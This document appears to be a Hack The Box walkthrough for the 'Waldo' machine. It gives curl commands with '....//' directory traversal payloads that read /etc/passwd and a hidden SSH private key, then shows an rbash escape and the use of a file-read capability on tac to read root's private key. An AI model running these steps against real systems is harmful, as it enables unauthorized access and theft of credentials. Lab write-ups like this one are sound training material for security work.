# [Waldo](https://app.hackthebox.com/machines/Waldo)

```bash
nmap -p- --min-rate 10000 10.10.10.87 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan for these ports.

```bash
nmap -A -sC -sV -p22,80 10.10.10.87 -Pn
```

![alt text](img/image-1.png)

While open our web application, I see such an web page.

![alt text](img/image-2.png)


Let's look at backend files for this processing.

![alt text](img/image-3.png)

Backend files are below.
```bash
dirRead.php
fileRead.php
fileWrite.php
fileDelete.php
```

Let's check `dirRead.php` file by using `curl` command.
```bash
curl -X POST -d "path=/" http://10.10.10.87/dirRead.php
```

![alt text](img/image-4.png)


Let's read files via `fileRead.php` file by using `curl` command.
```bash
curl -s -X POST -d "file=dirRead.php" http://10.10.10.87/fileRead.php | jq -r .file
```

![alt text](img/image-5.png)


For file bypass filters, I already know them.

![alt text](img/image-6.png)

For example, we can bypass `dirRead.php` file Directory Filter via below `Directory Traversal` payloads.
```bash
curl -s -X POST -d "path=....//....//....//" http://10.10.10.87/dirRead.php | jq -rc .
```

![alt text](img/image-7.png)


Let's read `/etc/passwd` file via `Directory Traversal` payload.
```bash
curl -s -X POST -d "file=....//....//....//etc/passwd" http://10.10.10.87/fileRead.php | jq -r .file
```

![alt text](img/image-8.png)

From this result, I see that `nobody` user is local user as because grep via `home`.

Let's check private key (id_rsa) file of `nobody` user to read.
```bash
curl -s -X POST -d "file=....//....//....//home/nobody/.ssh/.monitor" http://10.10.10.87/fileRead.php | jq -r .file
```

![alt text](img/image-9.png)


**Note:** As you see file `id_rsa` name changed into `.monitor`

I copied this private key file and change permission with  `600` and login via `ssh` command.

![alt text](img/image-10.png)

user.txt

![alt text](img/image-11.png)


While I run `netstat -ntpl` command, I see ports `22` and `8888`.

Let's use our private key file `.monitor` which we used before to authenticate into `localhost` via `monitor` user.
```bash
ssh -i /home/nobody/.ssh/.monitor monitor@localhost
```

![alt text](img/image-12.png)

It worked.

From my perspective of view, this user is setup `rbash` as because, commands I tried, don't work.

![alt text](img/image-13.png)


To escape from `rbash` shell means `restricted shell`,we need to specify shell type via `-t` option while joining into machine as below.
```bash
ssh -i /home/nobody/.ssh/.monitor monitor@localhost -t bash
```

Then, we need to specify `environmental` variabled called `$PATH` which locates executive directories.
```bash
export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

![alt text](img/image-14.png)


For `Privilege Escalation` vector, I looked at privileges of this user via `getcap` command.
```bash
getcap -r / 2>/dev/null
```

![alt text](img/image-15.png)


From here, I see `tac` privilege that, I can read all information, data and sensitive files.

That's why, we can read private key `id_rsa` file of `root` user.
```bash
tac /root/.ssh/id_rsa
```

![alt text](img/image-16.png)

Let's copy this and change privilege to `600` and then connect into machine via `ssh`.


**But this way doesn't work.**

root.txt

![alt text](img/image-17.png)